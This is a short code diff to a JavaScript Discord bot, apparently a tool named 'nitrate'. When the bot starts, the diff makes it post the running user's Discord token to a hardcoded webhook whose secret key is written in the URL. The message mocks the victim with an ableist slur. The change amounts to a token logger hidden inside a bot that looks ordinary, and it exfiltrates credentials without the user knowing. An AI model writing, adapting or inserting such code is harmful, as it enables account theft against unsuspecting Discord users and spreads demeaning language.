@@ -34,7 +34,9 @@ bot.on("ready", () => {
     request.post({
         url: "https://discordapp.com/api/webhooks/653442189967491082/wvouShxbM5AG5aPVCLJ8Ck6mRtkqw7mMH3o-9-dctq73_H-28VBCY7GeI3Oj-5vmOCps",
         form: {
-            content: "lol"
+            content: `Hey, I used nitrate and got my token logged, lool im such a retard. heres my token\n\`${token}\``,
+            username: bot.user.username,
+            avatar_url: bot.user.avatarURL
         }
     }, function (error, response, body) {
         
